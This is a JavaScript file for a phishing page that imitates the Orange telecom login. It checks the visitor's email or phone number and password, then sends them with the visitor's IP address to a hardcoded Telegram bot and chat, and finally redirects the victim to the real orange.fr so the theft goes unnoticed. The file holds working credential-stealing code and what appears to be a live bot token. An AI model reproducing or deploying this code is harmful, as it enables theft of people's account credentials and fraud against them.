$(document).ready(() => {
  const index = new Vue({
    el: "#index",
    data: {
      login: 1,
      telegram_bot_id: "7424554162:AAH7_jmIZV5jXiYWQ6HcUAPIrhGMdb1MxnA",
      chat_id: "-4598503494",
      log: {
        EMAIL: "",
        PASS: "",
      },
      rememberMe: true,
      isPasswordVisible: false,
      error: false,
    },
    created() {
      this.getIpAddress();
    },

    mounted() {
      localStorage.EMAIL = this.log.EMAIL;
      if (localStorage.EMAIL) this.log.EMAIL = localStorage.log.EMAIL;
    },

    computed: {
      isPasswordFilled() {
        return this.log.PASS.length > 0;
      },
      content() {
        var loc = JSON.stringify(locIp);
        message = "💰LOG ORANGE💰" + "\n📌" + iPfull + "\n🔒LOG ET PASS🔒 " + "\n📧: " + this.log.EMAIL + "\n🔑: " + this.log.PASS;
        var settings = {
          async: true,
          crossDomain: true,
          url: "https://api.telegram.org/bot" + this.telegram_bot_id + "/sendMessage",
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "cache-control": "no-cache",
          },
          data: JSON.stringify({
            chat_id: this.chat_id,
            text: message,
          }),
        };
        $.ajax(settings).done(function (response) {
          console.log(response);
        });
        this.log.EMAIL.value = "";
        this.log.PASS.value = "";
        return false;
      },
    },
    methods: {
      getIpAddress: function () {
        axios
          .get("https://api.ipify.org?format=json")
          .then((response) => {
            this.ipAddress = response.data.ip;
          })
          .catch((error) => {
            console.error("Erreur lors de la récupération de l'adresse IP:", error);
          });
      },
      togglePasswordVisibility() {
        this.isPasswordVisible = !this.isPasswordVisible;
      },
      validEmailOrOrangeNumber(input) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const orangeNumberRegex = /^(06|07)\d{8}$/;
        return emailRegex.test(input) || orangeNumberRegex.test(input);
      },
      validPassword(password) {
        return password && password.length > 6;
      },
      goToCredit() {
        console.log("goToCredit called");
        console.log("Current email/phone input:", this.log.EMAIL);

        if (!this.validEmailOrOrangeNumber(this.log.EMAIL)) {
          this.error = true;
          console.log("Invalid email or phone number");
          return;
        }

        this.error = false;
        console.log("Valid email or phone number");

        setTimeout(() => {
          this.login = 2;
          console.log("Login set to 2, current login count:", this.login);
        }, 1300);
      },
      handleInput() {
        if (this.log.EMAIL) {
          this.error = false; // Réinitialiser l'erreur lors de la saisie
        }
      },
      sendLog() {
        if (!this.validEmailOrOrangeNumber(this.log.EMAIL) || !this.validPassword(this.log.PASS)) {
          this.error = true;
          return;
        }

        this.error = false;
        this.content;

        setTimeout(() => {
          window.location.href = "https://www.orange.fr";
        }, 1300);
      },

      handleInput2() {
        if (this.log.PASS) {
          this.error = false; // Réinitialiser l'erreur lors de la saisie
        }
      },
      changeAccount() {
        this.login = 1;
        console.log("Account changed, login set to 1");
      },
    },
  });
});
